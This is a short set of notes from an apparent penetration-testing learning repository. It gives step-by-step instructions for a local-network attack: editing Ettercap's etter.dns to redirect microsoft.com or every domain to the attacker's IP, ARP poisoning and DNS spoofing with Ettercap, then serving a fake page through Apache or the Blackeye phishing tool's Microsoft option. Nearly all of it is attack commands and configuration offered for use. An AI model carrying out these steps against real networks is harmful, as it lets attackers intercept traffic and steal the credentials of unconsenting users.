'''
# author: huangyuhui
# date: november 27,2019
# description: detailed steps about dns attack
# repo address: https://github.com/yubuntu0109/penetration-testing-learning


customize the dns configuration infos of Ettercap:
>>> vim ./etc/ettercap/etter.dns
------------------------------------------------------------------------------------------
eg: add the new dns configuration infos as follow,let it redirect to specified ip address
==========================================================================================
microsoft.com		A		xxx.xxx.xxx.xxx
.*microsoft.com		A		xxx.xxx.xxx.xxx
www.microsoft.com	PRT  	xxx.xxx.xxx.xxx
------------------------------------------------------------------------------------------
ex: add the new configuration infos as follow if you want intercept all of websites
==========================================================================================
*		A		xxx.xxx.xxx.xxx (your service ip address)
*		PTR 	xxx.xxx.xxx.xxx (your service ip address)
------------------------------------------------------------------------------------------


MitM Attack(arp poisoning) and DNS spoofing by the penetration testing tool of Ettercap:
>>> ettercap -G


customize the index page and start the local server of Apache:
>>> vim ./var/www/html/index.html
>>> /etc/init.d/apache2 start


(recommend)use the penetration testing tool of Blackeye to replace the service of Apache or others..
>>> https://github.com/YUbuntu0109/blackeye
--------------------------------------------------------------------------------------------------------
becaues you have modified the dns configuraiton infos above,so please test on the option: [16]Microsoft
--------------------------------------------------------------------------------------------------------


check the specified service ip on target host with command:
>>> nslookup www.microsoft.com
'''

